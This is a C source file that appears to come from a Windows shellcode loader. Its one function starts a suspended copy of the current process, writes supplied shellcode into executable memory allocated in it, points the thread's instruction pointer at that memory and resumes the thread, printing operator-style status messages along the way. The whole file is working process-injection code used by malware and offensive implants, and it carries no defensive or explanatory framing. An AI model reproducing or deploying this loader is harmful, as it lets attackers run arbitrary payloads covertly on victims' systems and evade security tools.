#include "exec.h"
#include <stdio.h>

void execute_in_new_process(BYTE *shellcode, size_t shellcode_size) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    if (!CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] Error creating process: %d\n", GetLastError());
        return;
    }
    printf("[*] New process created with PID %d\n", pi.dwProcessId);

    LPVOID remotePtr = VirtualAllocEx(pi.hProcess, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remotePtr == NULL) {
        printf("[!] Error allocating memory in the new process: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return;
    }
    printf("[*] Memory allocated at 0x%p in new process\n", remotePtr);

    if (!WriteProcessMemory(pi.hProcess, remotePtr, shellcode, shellcode_size, NULL)) {
        printf("[!] Error writing to process memory: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return;
    }
    printf("[*] Shellcode written to new process memory\n");

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(pi.hThread, &ctx)) {
#ifdef _M_IX86
        ctx.Eip = (DWORD)remotePtr;
#elif defined(_M_X64)
        ctx.Rip = (DWORD_PTR)remotePtr;
#endif
        SetThreadContext(pi.hThread, &ctx);
        printf("[*] Instruction pointer set. Resuming thread in new process...\n");
    }

    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
    printf("[*] Shellcode execution complete. New process has terminated.\n");
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
